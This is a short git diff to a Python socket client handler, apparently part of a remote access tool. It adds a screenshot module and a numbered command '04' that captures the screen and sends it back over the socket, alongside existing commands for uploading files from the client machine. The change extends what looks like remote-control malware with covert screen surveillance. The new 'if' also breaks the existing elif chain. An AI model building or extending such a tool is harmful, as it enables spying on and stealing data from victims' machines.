@@ -2,7 +2,7 @@ import subprocess
 import os
 #from filedownload import *
 from clientfileupload import * 
- 
+from screenshot import * 
              
 def clienthandler(my_socket):
      print ("[+] Handling Client Side Connection")
@@ -20,6 +20,9 @@ def clienthandler(my_socket):
              
          if cmd == "03" or cmd =="3":
              upload_file_folder(my_socket)
+         if cmd == "04" or cmd =="4":
+             capture_screenshot(my_socket)
+         
          elif cmd == "quit" or cmd == "exit" or cmd == "99" :
              break
          else :
